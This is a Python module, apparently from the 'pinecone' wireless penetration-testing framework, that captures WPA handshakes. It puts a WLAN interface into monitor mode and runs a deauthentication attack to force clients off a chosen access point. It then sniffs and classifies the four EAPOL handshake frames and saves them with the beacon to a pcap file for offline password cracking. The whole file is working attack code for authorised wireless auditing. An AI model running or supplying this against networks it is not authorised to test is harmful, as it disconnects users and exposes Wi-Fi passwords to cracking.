from types import SimpleNamespace
from pathlib2 import Path
from pony.orm import *
from pyric import pyw
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon

from pinecone.core.script import BaseScript
from pinecone.utils.interface import set_monitor_mode, check_chset
from pinecone.utils.packet import compare_macs, BROADCAST_MAC, get_dot11_addrs_info, WPA_key, \
    get_flags_set
from pinecone.utils.template import opts_to_str
from pinecone.core.options import Option, OptionDict


class Module(BaseScript):
    META = {
        "id": "scripts/attack/wpa_handshake",
        "name": "WPA handshake capture script",
        "author": "Valentín Blanco (https://github.com/valenbg1)",
        "version": "1.0.0",
        "description": "Captures WPA handshakes by deauthenticating clients and then monitoring the handshake. If some "
                       "required options for the attack (such as --bssid or --channel) are omitted, they are obtained, "
                       "when possible, from the recon db (use the module discovery/recon to populate it).",
        "options": OptionDict(),
        "depends": {"attack/deauth"}
    }
    META["options"].add(Option("INTERFACE", "wlan0", True, "monitor mode capable WLAN interface."))
    META["options"].add(Option("BSSID", description="BSSID of target AP."))
    META["options"].add(Option("SSID", description="SSID of target AP."))
    META["options"].add(Option("CLIENT", BROADCAST_MAC, description="MAC of target client."))
    META["options"].add(Option("CHANNEL", description="channel of target AP, if 0 or negative the WLAN interface "
                                                      "(option --iface) current channel will be used.", opt_type=int))
    META["options"].add(Option("NO_DEAUTH", False, False, "do not deauth client(s) from AP", bool))
    META["options"].add(Option("SNIFF_TIME", 10, False, "time (in seconds) that the interface will be monitoring", int))

    START_SCRIPT_TEMPLATE_PATH = Path(Path(__file__).parent, "start_wpa_handshake_template").resolve()  # type: Path
    START_SCRIPT_FILENAME = "start_wpa_handshake_script"

    def __init__(self):
        self.handshakes_cache = None
        self.complete_handshake = False
        self.ap_beacon = None
        self.opts = None
        self.cmd = None

        super().__init__()

    def run(self, opts, cmd):
        opts = opts.get_opts_namespace()

        with db_session:
            bss = cmd.select_bss(opts.ssid, opts.bssid, opts.client)

            if bss:
                if not ("WPA" in bss.encryption_types and "PSK" in bss.authn_types):
                    cmd.perror("[!] Selected AP encryption mode is not WPA[2]-PSK.")

                if not opts.bssid:
                    opts.bssid = bss.bssid

                if opts.channel is None:
                    opts.channel = bss.channel

        if opts.bssid is None:
            cmd.perror("BSSID is missing, and couldn't be obtained from the recon db.")
        elif opts.channel is None:
            cmd.perror("Channel is missing, and couldn't be obtained from the recon db.")
        else:
            interface = set_monitor_mode(opts.interface)

            if opts.channel > 0:
                check_chset(interface, opts.channel)
            else:
                opts.channel = pyw.chget(interface)

            opts.all_clients = compare_macs(opts.client, BROADCAST_MAC)
            self.clear_caches()
            self.opts = opts
            self.cmd = cmd

            if not opts.no_deauth:
                script_opts = OptionDict()
                script_opts.add(Option("INTERFACE", opts.interface))
                script_opts.add(Option("BSSID", opts.bssid))
                script_opts.add(Option("CHANNEL", opts.channel))
                script_opts.add(Option("CLIENT", opts.client))

                script_args = SimpleNamespace()
                script_args.deauth_args = opts_to_str(script_opts)

                super().run(script_args, cmd)
            else:
                cmd.pfeedback("[i] Disabled client(s) deauthentication.")

            if opts.all_clients:
                cmd.pfeedback(
                    "[i] Monitoring for {} secs on channel {} WPA handshakes between all clients and AP {}...".format(
                        opts.sniff_time, opts.channel, opts.bssid))
            else:
                cmd.pfeedback(
                    "[i] Monitoring for {} secs on channel {} WPA handshakes between client {} and AP {}...".format(
                        opts.sniff_time, opts.channel, opts.client, opts.bssid))
            sniff(iface=opts.interface, prn=self.handle_packet, timeout=opts.sniff_time, store=False,
                  stop_filter=lambda x: self.complete_handshake)

    def clear_caches(self) -> None:
        self.handshakes_cache = {}
        self.complete_handshake = False
        self.ap_beacon = None

    def handle_packet(self, packet: Packet) -> None:
        try:
            if not self.ap_beacon and packet.haslayer(Dot11Beacon) and compare_macs(packet[Dot11].addr3,
                                                                                    self.opts.bssid):
                self.ap_beacon = packet
            elif packet.haslayer(WPA_key):
                self.handle_eapol_packet(packet)
        except Exception as e:
            self.cmd.perror("[!] Exception while handling packet: {}\n{}".format(e, packet.show(dump=True)))

    def handle_eapol_packet(self, packet: Packet) -> None:
        dot11_addrs_info = get_dot11_addrs_info(packet)
        dot11_ds_bits = dot11_addrs_info["ds_bits"]

        if len(dot11_ds_bits) == 1:  # to-DS or from-DS
            bssid = dot11_addrs_info["bssid"]
            client_mac = dot11_addrs_info["sa"] if "to-DS" in dot11_ds_bits else dot11_addrs_info["da"]

            if compare_macs(bssid, self.opts.bssid) and (
                    self.opts.all_clients or compare_macs(self.opts.client, client_mac)):
                if client_mac not in self.handshakes_cache:
                    self.handshakes_cache[client_mac] = [None, None, None, None]

                wpa_key_packet = packet[WPA_key]

                if wpa_key_packet.sprintf("%key_info_type%") == "pairwise":
                    key_info_flags = get_flags_set(wpa_key_packet.key_info_flags)
                    frame_number = None

                    # Frame 1: not install, ACK, not MIC.
                    if "install" not in key_info_flags and "ACK" in key_info_flags and "MIC" not in key_info_flags:
                        frame_number = 0
                    elif "install" not in key_info_flags and "ACK" not in key_info_flags and "MIC" in key_info_flags:
                        # Frame 4: not install, not ACK, MIC, nonce == 0.
                        if all(n == 0 for n in wpa_key_packet.nonce):
                            frame_number = 3
                        # Frame 2: not install, not ACK, MIC, nonce != 0.
                        else:
                            frame_number = 1
                    # Frame 3: install, ACK, MIC.
                    elif "install" in key_info_flags and "ACK" in key_info_flags and "MIC" in key_info_flags:
                        frame_number = 2

                    if frame_number is not None:
                        self.cmd.pfeedback(
                            "[i] Captured handshake frame #{} for client {}.".format(frame_number + 1, client_mac))
                        self.handshakes_cache[client_mac][frame_number] = packet

                    if all(p is not None for p in self.handshakes_cache[client_mac]):
                        self.complete_handshake = True
                        self.cmd.pfeedback(
                            "[i] Captured complete WPA 4-way handshake for client {}.".format(client_mac))

                        # TODO
                        wrpcap("tmp/handshake.pcap", [self.ap_beacon] + self.handshakes_cache[client_mac])

    def stop(self, cmd):
        pass
